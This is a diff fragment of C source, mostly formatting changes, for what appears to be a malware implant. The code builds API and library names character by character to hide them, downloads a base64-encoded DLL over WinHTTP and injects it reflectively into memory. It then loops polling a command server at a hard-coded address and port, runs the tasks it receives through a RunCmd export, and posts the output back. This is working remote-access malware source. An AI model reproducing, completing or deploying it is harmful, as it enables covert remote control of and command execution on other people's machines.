-    DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)(lpEncodedBuffer, dwEncodedDllSize, 0x000000001, lpRawBuffer, pdwDllSize, NULL, NULL);
+    DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
+    (
+        lpEncodedBuffer,
+        dwEncodedDllSize,
+        0x000000001,
+        lpRawBuffer,
+        pdwDllSize,
+        NULL,
+        NULL
+    );
 
     ((FREE)api->free)(lpEncodedBuffer);
     ((FREE)api->free)(lpContentLength);
@@ -629,7 +673,8 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize) {
     { return 0;}
 }
 
-UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
+UINT_PTR GetRLOffset(PAPI api, PVOID lpDll)
+{
     WCHAR rlName[] = { 'R', 'e', 'f', 'l', 'e', 'c', 't', 'i', 'v', 'e', 'L', 'o', 'a', 'd', 'e', 'r', 0 };
 
     UINT_PTR uiDll = (UINT_PTR)lpDll;
@@ -690,7 +735,8 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
     functionAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfFunctions, uiDll);
 
     CHAR* exportedFunctionName = {0};
-    while(dwNumberOfEntries--) {
+    while(dwNumberOfEntries--)
+    {
         exportedFunctionName = (CHAR*)(uiDll + Rva2Offset(DEREF(functionNameAddresses), uiDll));
         if (my_strcmp(exportedFunctionName, (CHAR*)rlName) == 0)
         {
@@ -725,16 +771,13 @@ UINT_PTR GetRLOffset(PAPI api, PVOID lpDll) {
     return rlAddress;
 }
 
-HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
+HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize)
+{
     DWORD loaderOffset;
     REFLECTIVELOADER pReflectiveLoader;
     DLLMAIN pDllMain;
 
     loaderOffset = GetRLOffset(api, lpDll);
-
-    //WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', 'O', 'f', 'f', 's', 'e', 't', ':', ' ', '%', 'p', '\n', 0 };
-    //((WPRINTF)api->wprintf)(loader, loaderOffset);
-    
 
     #ifdef DEBUG
     WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
@@ -753,32 +796,29 @@ HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize) { //
     pDllMain = (DLLMAIN)pReflectiveLoader();
 
     #ifdef DEBUG
-    CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 0};
+    CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 0 };
     ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
     #endif
 
-    //WCHAR test[] = { 't', 'e', 's', 't', 0 };
-    //((WPRINTF)api->wprintf)(test);
-
     if( pDllMain != NULL )
-	{
-		// call the loaded librarys DllMain to get its HMODULE
-		if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
-		{
-		    #ifdef DEBUG
-            CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0};
+    {
+        // call the loaded librarys DllMain to get its HMODULE
+        if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
+        {
+            #ifdef DEBUG
+            CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0 };
             ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
             #endif
-		    hDllBase = NULL;
-		}
-	}
+            hDllBase = NULL;
+        }
+    }
     else
     {
         #ifdef DEBUG
-        CHAR text[] = {'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0};
+        CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0 };
         ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
         #endif
-	}
+    }
 
     return hDllBase;
 }
@@ -788,16 +828,14 @@ CHAR* myStrtok(CHAR* str, CHAR delim, BOOL reset)
     static DWORD index = 0;
     if (reset)
     { index=0; return NULL; }
-    CHAR* token = {0};
+    CHAR* token = { 0 };
     DWORD lenStr = myStrlenA(str);
     str += index;
 
     for (int i=0; i<lenStr; i++)
     {
         if (str[i] == delim)
-        {
-            str[i] = '\0';
-        }
+        { str[i] = '\0'; }
     }
 
     token = str;
@@ -839,12 +877,13 @@ CHAR* myTrimB(PAPI api, CHAR* str, CHAR trim)
     return outStr;
 }
 
-CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid) {
+CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid)
+{
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
     CHAR* task;
-    CHAR delim = {'\n'};
+    CHAR delim = { '\n' };
     CHAR* token = myStrtok(tmpJson, delim, FALSE);
-    CHAR blacklist[] = {'[', ']', '\0'};
+    CHAR blacklist[] = { '[', ']', '\0' };
 
     // SKIP [ and ]
     for (int i=0; i<=myStrlenA(blacklist)-1; i++)
@@ -874,48 +913,49 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid) {
     return task;
 }
 
-void messagebox() {
+void messagebox()
+{
     API Api = { 0 };
     PAPI api = &Api;
 
     // Library Names
-    CHAR user32_c[] = {'u','s','e','r','3','2', '.', 'd', 'l', 'l', 0};
-    CHAR winhttp_c[] = {'w','i','n','h','t','t','p', 0};
-    CHAR msvcrt_c[] = {'m','s','v','c','r','t', 0};
-    CHAR crypt32_c[] = {'c', 'r', 'y', 'p', 't', '3', '2', '.', 'd', 'l', 'l', 0};
-    CHAR shlwapi_c[] = {'s', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0};
+    CHAR user32_c[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
+    CHAR winhttp_c[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', 0 };
+    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', 0 };
+    CHAR crypt32_c[] = { 'c', 'r', 'y', 'p', 't', '3', '2', '.', 'd', 'l', 'l', 0 };
+    CHAR shlwapi_c[] = { 's', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };
 
     // Library Declarations
     UINT64 kernel32dll, winhttpdll, msvcrtdll, user32dll, crypt32dll, shlwapidll;
  
     // Function Names
-    CHAR messageBoxA_c[] = {'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0};
-    CHAR messageBoxW_c[] = {'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0};
-    CHAR loadlibrarya_c[] = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
-    CHAR winHttpOpen_c[] = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0};
-    CHAR winHttpConnect_c[] = {'W','i','n','H','t','t','p','C','o','n','n','e','c','t', 0};
-    CHAR winHttpOpenRequest_c[] = {'W','i','n','H','t','t','p','O','p','e','n','R','e','q','u','e','s','t', 0};
-    CHAR winHttpSendRequest_c[] = {'W','i','n','H','t','t','p','S','e','n','d','R','e','q','u','e','s','t', 0};
-    CHAR winHttpReceiveResponse_c[] = {'W','i','n','H','t','t','p','R','e','c','e','i','v','e','R','e','s','p', 'o', 'n', 's', 'e', 0};
-    CHAR WinHttpQueryDataAvailable_c[] = {'W','i','n','H','t','t','p','Q','u','e','r','y','D','a','t','a','A','v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0};
-    CHAR winHttpQueryHeaders_c[] = {'W','i','n','H','t','t','p','Q','u','e','r','y','H','e','a','d','e','r', 's', 0};
-    CHAR winHttpReadData_c[] = {'W','i','n','H','t','t','p','R','e','a','d','D','a','t','a', 0};
-    CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0};
-    CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0};
-    CHAR printf_c[] = {'p', 'r', 'i', 'n', 't', 'f', 0};
-    CHAR snprintf_c[] = {'_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0};
-    CHAR malloc_c[] = {'m', 'a', 'l', 'l', 'o', 'c', 0};
-    CHAR calloc_c[] = {'c', 'a', 'l', 'l', 'o', 'c', 0};
-    CHAR free_c[] = {'f', 'r', 'e', 'e', 0};
-    CHAR virtualProtect_c[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0};
-    CHAR virtualAlloc_c[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0};
-    CHAR createThread_c[] = {'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0};
-    CHAR waitForSingleObject_c[] = {'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0};
-    CHAR CryptStringToBinaryA_c[] = {'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0};
-    CHAR CryptBinaryToStringA_c[] = {'C', 'r', 'y', 'p', 't', 'B', 'i', 'n', 'a', 'r', 'y', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0};
-    CHAR StrToIntW_c[] = {'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0};
-    CHAR closeHandle_c[] = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0};
-    CHAR sleep_c[] = {'S', 'l', 'e', 'e', 'p', 0};
+    CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
+    CHAR messageBoxW_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0 };
+    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
+    CHAR winHttpOpen_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
+    CHAR winHttpConnect_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
+    CHAR winHttpOpenRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
+    CHAR winHttpSendRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
+    CHAR winHttpReceiveResponse_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
+    CHAR WinHttpQueryDataAvailable_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0 };
+    CHAR winHttpQueryHeaders_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
+    CHAR winHttpReadData_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
+    CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0 };
+    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0 };
+    CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
+    CHAR snprintf_c[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0 };
+    CHAR malloc_c[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
+    CHAR calloc_c[] = { 'c', 'a', 'l', 'l', 'o', 'c', 0 };
+    CHAR free_c[] = { 'f', 'r', 'e', 'e', 0 };
+    CHAR virtualProtect_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
+    CHAR virtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
+    CHAR createThread_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
+    CHAR waitForSingleObject_c[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
+    CHAR CryptStringToBinaryA_c[] = { 'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0 };
+    CHAR CryptBinaryToStringA_c[] = { 'C', 'r', 'y', 'p', 't', 'B', 'i', 'n', 'a', 'r', 'y', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0 };
+    CHAR StrToIntW_c[] = { 'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0 };
+    CHAR closeHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
+    CHAR sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0 };
 
     // Get Kernel32
     kernel32dll = GetKernel32();
@@ -985,30 +1025,30 @@ void messagebox() {
     ESG_STD_API EsgStdApi = { 0 };
     PESG_STD_API PEsgStdApi = &EsgStdApi;
 
-    //((PRINTF)api->printf)("Raw dll size: %d\n", dwDllSize);
     pEsgStdDll = inject(api, pEsgStdDll, dwDllSize);
 
-    CHAR runCmd_c[] = {'R', 'u', 'n', 'C', 'm', 'd', 0};
+    CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
 
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
 
-    WCHAR wServer[] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};
-    WCHAR tasksPath[] = {'/', 't', 'a', 's', 'k', 's', '/', 0};
-    WCHAR sendOutputPath[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/', 0};
-    WCHAR uuid[] = {'1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0};
+    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
+    WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
+    WCHAR sendOutputPath[] = { '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/', 0 };
+    WCHAR uuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
     WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
     WCHAR* fullPath2;
     INTERNET_PORT port = 5001;
 
     CHAR* jsonResponse;
-    CHAR* taskId = {0};
-    CHAR* agentUuid = {0};
+    CHAR* taskId = { 0 };
+    CHAR* agentUuid = { 0 };
     CHAR* task;
     CHAR* taskOutput;
     CHAR* b64EncodedOutput;
     DWORD b64EncodedOutputSize;
     DWORD sizeOfOutput;
-    CHAR jsonFormat[] = {
+    CHAR jsonFormat[] =
+    {
     '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
     ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
     '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
@@ -1016,7 +1056,7 @@ void messagebox() {
     };
     DWORD totalJsonSize;
     CHAR* json;
-    CHAR exit[] = {'e', 'x', 'i', 't', 0};
+    CHAR exit[] = { 'e', 'x', 'i', 't', 0 };
 
     while (TRUE)
     {
@@ -1044,23 +1084,33 @@ void messagebox() {
         ((PRINTF)api->printf)("\ntotalJsonSize: %d\n", totalJsonSize);
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
-        WCHAR fullPath2[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/','1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0};
+        WCHAR fullPath2[] =
+        {
+            '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
+            't', '/','1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-',
+            '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f',
+            'a', '2', 'f', '0', 'd', '0', 0
+        };
         PostRequest(api, wServer, port, fullPath2, json);
 
-        if (taskOutput) {
+        if (taskOutput)
+        {
             ((FREE)api->free)(taskOutput);
         }
-        if (b64EncodedOutput) {
+        if (b64EncodedOutput)
+        {
             ((FREE)api->free)(b64EncodedOutput);
         }
-        if (json) {
+        if (json)
+        {
             ((FREE)api->free)(json);
         }
 
         ((SLEEP)api->Sleep)(3000);
         ((PRINTF)api->printf)("asdf");
     }
-    if (fullPath) {
+    if (fullPath)
+    {
         ((PRINTF)api->printf)("free fullpath");
         ((FREE)api->free)(fullPath);
     }
